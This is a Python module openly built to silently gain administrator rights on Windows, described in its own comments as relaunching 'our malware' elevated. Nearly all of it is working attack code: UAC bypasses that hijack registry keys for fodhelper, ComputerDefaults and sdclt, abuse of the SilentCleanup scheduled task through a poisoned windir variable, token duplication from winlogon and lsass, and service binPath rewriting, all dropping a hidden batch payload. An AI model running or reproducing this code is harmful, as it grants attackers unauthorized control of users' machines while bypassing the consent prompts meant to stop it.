"""
Silent Elevation Module
Gain administrator access without user dialogues or prompts
"""
import os
import sys
import subprocess
import ctypes
import winreg
import tempfile
import shutil
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional
import base64
import time
import threading

class SilentElevation:
    """Silent privilege escalation without user interaction"""
    
    def __init__(self):
        self.elevation_methods = []
        self.current_privileges = self._check_privileges()
        
    def _check_privileges(self) -> Dict:
        """Check current privilege level"""
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            return {
                "is_admin": bool(is_admin),
                "can_elevate": self._can_silent_elevate()
            }
        except:
            return {"is_admin": False, "can_elevate": False}
    
    def _can_silent_elevate(self) -> bool:
        """Check if silent elevation is possible"""
        try:
            # Check for auto-elevation opportunities
            auto_elevate_paths = [
                r"C:\Windows\System32\fodhelper.exe",
                r"C:\Windows\System32\ComputerDefaults.exe",
                r"C:\Windows\System32\sdclt.exe"
            ]
            
            for path in auto_elevate_paths:
                if os.path.exists(path):
                    return True
            
            return False
        except:
            return False
    
    def attempt_silent_elevation(self) -> Dict:
        """Attempt all silent elevation methods"""
        try:
            results = []
            
            # Method 1: fodhelper.exe bypass
            fodhelper_result = self._fodhelper_bypass()
            results.append(fodhelper_result)
            
            # Method 2: ComputerDefaults.exe bypass  
            computerdefaults_result = self._computerdefaults_bypass()
            results.append(computerdefaults_result)
            
            # Method 3: sdclt.exe bypass
            sdclt_result = self._sdclt_bypass()
            results.append(sdclt_result)
            
            # Method 4: SilentCleanup task abuse
            silentcleanup_result = self._silentcleanup_bypass()
            results.append(silentcleanup_result)
            
            # Method 5: Token manipulation
            token_result = self._token_manipulation()
            results.append(token_result)
            
            # Method 6: Service manipulation
            service_result = self._service_manipulation()
            results.append(service_result)
            
            successful_methods = [r for r in results if r.get("success")]
            
            return {
                "success": len(successful_methods) > 0,
                "methods_attempted": len(results),
                "successful_methods": len(successful_methods),
                "results": results,
                "elevated": self._check_if_elevated(),
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _fodhelper_bypass(self) -> Dict:
        """Bypass UAC using fodhelper.exe auto-elevation"""
        try:
            # Create elevated payload
            payload_path = self._create_elevation_payload()
            
            # Set registry key for fodhelper bypass
            key_path = r"SOFTWARE\Classes\ms-settings\Shell\Open\command"
            
            try:
                # Create registry structure
                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_path)
                    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                
                # Execute fodhelper in background
                subprocess.Popen(
                    ['fodhelper.exe'], 
                    shell=True, 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                # Wait for elevation
                time.sleep(2)
                
                # Clean up registry
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                    parent_key = r"SOFTWARE\Classes\ms-settings\Shell\Open"
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, parent_key)
                    parent_key = r"SOFTWARE\Classes\ms-settings\Shell"
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, parent_key)
                    parent_key = r"SOFTWARE\Classes\ms-settings"
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, parent_key)
                except:
                    pass
                
                return {
                    "success": True,
                    "method": "fodhelper_bypass",
                    "payload_path": payload_path,
                    "silent": True
                }
                
            except Exception as e:
                return {"success": False, "method": "fodhelper_bypass", "error": str(e)}
                
        except Exception as e:
            return {"success": False, "method": "fodhelper_bypass", "error": str(e)}
    
    def _computerdefaults_bypass(self) -> Dict:
        """Bypass UAC using ComputerDefaults.exe auto-elevation"""
        try:
            payload_path = self._create_elevation_payload()
            key_path = r"SOFTWARE\Classes\ms-settings\Shell\Open\command"
            
            try:
                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_path)
                    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                
                subprocess.Popen(
                    ['ComputerDefaults.exe'],
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                time.sleep(2)
                
                return {
                    "success": True,
                    "method": "computerdefaults_bypass",
                    "payload_path": payload_path,
                    "silent": True
                }
                
            except Exception as e:
                return {"success": False, "method": "computerdefaults_bypass", "error": str(e)}
                
        except Exception as e:
            return {"success": False, "method": "computerdefaults_bypass", "error": str(e)}
    
    def _sdclt_bypass(self) -> Dict:
        """Bypass UAC using sdclt.exe auto-elevation"""
        try:
            payload_path = self._create_elevation_payload()
            key_path = r"SOFTWARE\Classes\Folder\shell\open\command"
            
            try:
                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_path)
                    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                
                subprocess.Popen(
                    ['sdclt.exe', '/KickOffElev'],
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                time.sleep(2)
                
                # Clean up
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                except:
                    pass
                
                return {
                    "success": True,
                    "method": "sdclt_bypass",
                    "payload_path": payload_path,
                    "silent": True
                }
                
            except Exception as e:
                return {"success": False, "method": "sdclt_bypass", "error": str(e)}
                
        except Exception as e:
            return {"success": False, "method": "sdclt_bypass", "error": str(e)}
    
    def _silentcleanup_bypass(self) -> Dict:
        """Bypass UAC using SilentCleanup scheduled task"""
        try:
            payload_path = self._create_elevation_payload()
            
            # Backup original windir
            original_windir = os.environ.get('WINDIR', r'C:\Windows')
            
            # Create malicious windir value
            malicious_windir = f'"{payload_path}" && "{original_windir}"'
            
            try:
                # Modify environment variable
                key_path = r"Environment"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, malicious_windir)
                
                # Trigger SilentCleanup task
                subprocess.run(
                    ['schtasks', '/run', '/tn', r'\Microsoft\Windows\DiskCleanup\SilentCleanup'],
                    shell=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                time.sleep(3)
                
                # Restore original windir
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, original_windir)
                
                return {
                    "success": True,
                    "method": "silentcleanup_bypass",
                    "payload_path": payload_path,
                    "silent": True
                }
                
            except Exception as e:
                return {"success": False, "method": "silentcleanup_bypass", "error": str(e)}
                
        except Exception as e:
            return {"success": False, "method": "silentcleanup_bypass", "error": str(e)}
    
    def _token_manipulation(self) -> Dict:
        """Manipulate access tokens for elevation"""
        try:
            # Look for high-privilege processes to impersonate
            target_processes = ['winlogon.exe', 'lsass.exe', 'services.exe']
            
            for proc_name in target_processes:
                try:
                    # Find process
                    for proc in __import__('psutil').process_iter(['pid', 'name']):
                        if proc.info['name'].lower() == proc_name:
                            # Attempt token duplication
                            result = self._duplicate_token(proc.info['pid'])
                            if result:
                                return {
                                    "success": True,
                                    "method": "token_manipulation",
                                    "target_process": proc_name,
                                    "target_pid": proc.info['pid'],
                                    "silent": True
                                }
                except:
                    continue
            
            return {"success": False, "method": "token_manipulation", "error": "No suitable processes found"}
            
        except Exception as e:
            return {"success": False, "method": "token_manipulation", "error": str(e)}
    
    def _duplicate_token(self, target_pid: int) -> bool:
        """Duplicate token from target process"""
        try:
            import ctypes
            from ctypes import wintypes
            
            # Constants
            PROCESS_QUERY_INFORMATION = 0x0400
            TOKEN_DUPLICATE = 0x0002
            TOKEN_ASSIGN_PRIMARY = 0x0001
            TOKEN_QUERY = 0x0008
            TOKEN_IMPERSONATE = 0x0004
            SecurityImpersonation = 2
            TokenPrimary = 1
            
            # Open target process
            process_handle = ctypes.windll.kernel32.OpenProcess(
                PROCESS_QUERY_INFORMATION,
                False,
                target_pid
            )
            
            if not process_handle:
                return False
            
            try:
                # Open process token
                token_handle = wintypes.HANDLE()
                if not ctypes.windll.advapi32.OpenProcessToken(
                    process_handle,
                    TOKEN_DUPLICATE | TOKEN_QUERY,
                    ctypes.byref(token_handle)
                ):
                    return False
                
                # Duplicate token
                dup_token = wintypes.HANDLE()
                if not ctypes.windll.advapi32.DuplicateTokenEx(
                    token_handle,
                    TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
                    None,
                    SecurityImpersonation,
                    TokenPrimary,
                    ctypes.byref(dup_token)
                ):
                    ctypes.windll.kernel32.CloseHandle(token_handle)
                    return False
                
                # Impersonate user
                success = ctypes.windll.advapi32.ImpersonateLoggedOnUser(dup_token)
                
                # Cleanup
                ctypes.windll.kernel32.CloseHandle(dup_token)
                ctypes.windll.kernel32.CloseHandle(token_handle)
                
                return bool(success)
                
            finally:
                ctypes.windll.kernel32.CloseHandle(process_handle)
                
        except Exception as e:
            print(f"Token duplication error: {e}")
            return False
    
    def _service_manipulation(self) -> Dict:
        """Manipulate services for privilege escalation"""
        try:
            # Look for services with weak permissions
            weak_services = self._find_weak_services()
            
            if weak_services:
                service_name = weak_services[0]
                payload_path = self._create_elevation_payload()
                
                # Attempt to modify service binary path
                result = subprocess.run([
                    'sc', 'config', service_name,
                    'binPath=', f'"{payload_path}"'
                ], capture_output=True, text=True, shell=True)
                
                if result.returncode == 0:
                    # Start the service
                    subprocess.run(['sc', 'start', service_name], shell=True)
                    
                    return {
                        "success": True,
                        "method": "service_manipulation",
                        "service_name": service_name,
                        "payload_path": payload_path,
                        "silent": True
                    }
            
            return {"success": False, "method": "service_manipulation", "error": "No weak services found"}
            
        except Exception as e:
            return {"success": False, "method": "service_manipulation", "error": str(e)}
    
    def _find_weak_services(self) -> List[str]:
        """Find services with weak permissions"""
        try:
            # Query services
            result = subprocess.run(['sc', 'query'], capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                services = []
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'SERVICE_NAME:' in line:
                        service_name = line.split(':')[1].strip()
                        # Check if we can modify this service
                        if self._can_modify_service(service_name):
                            services.append(service_name)
                
                return services[:3]  # Return first 3 modifiable services
            
            return []
        except:
            return []
    
    def _can_modify_service(self, service_name: str) -> bool:
        """Check if service can be modified"""
        try:
            # Attempt to query service config
            result = subprocess.run([
                'sc', 'qc', service_name
            ], capture_output=True, text=True, shell=True)
            
            return result.returncode == 0
        except:
            return False
    
    def _create_elevation_payload(self) -> str:
        """Create payload for elevation"""
        try:
            # Create a script that re-launches our malware with admin rights
            payload_content = f'''
@echo off
cd /d "{os.getcwd()}"
python "{sys.argv[0]}" --elevated
'''
            
            # Save to temp file
            temp_dir = tempfile.gettempdir()
            payload_path = os.path.join(temp_dir, f"elevation_{int(time.time())}.bat")
            
            with open(payload_path, 'w') as f:
                f.write(payload_content)
            
            # Set file attributes to hidden
            subprocess.run(['attrib', '+h', payload_path], shell=True)
            
            return payload_path
            
        except Exception as e:
            # Fallback to simple command
            return f'cmd.exe /c "cd /d {os.getcwd()} && python {sys.argv[0]} --elevated"'
    
    def _check_if_elevated(self) -> bool:
        """Check if we successfully elevated"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def auto_elevate_on_startup(self) -> Dict:
        """Automatically attempt elevation when program starts"""
        try:
            if self.current_privileges["is_admin"]:
                return {
                    "success": True,
                    "message": "Already running as administrator",
                    "elevated": True
                }
            
            if not self.current_privileges["can_elevate"]:
                return {
                    "success": False,
                    "message": "No elevation methods available",
                    "elevated": False
                }
            
            # Attempt silent elevation
            elevation_result = self.attempt_silent_elevation()
            
            if elevation_result["success"]:
                return {
                    "success": True,
                    "message": "Silent elevation successful",
                    "methods_used": elevation_result["successful_methods"],
                    "elevated": True
                }
            else:
                return {
                    "success": False,
                    "message": "Silent elevation failed",
                    "elevated": False
                }
                
        except Exception as e:
            return {"success": False, "error": str(e), "elevated": False}
    
    def get_elevation_status(self) -> Dict:
        """Get current elevation status"""
        return {
            "success": True,
            "current_privileges": self._check_privileges(),
            "elevation_methods_available": len(self.elevation_methods),
            "can_auto_elevate": self._can_silent_elevate()
        }

# Global silent elevation instance
silent_elevation = SilentElevation()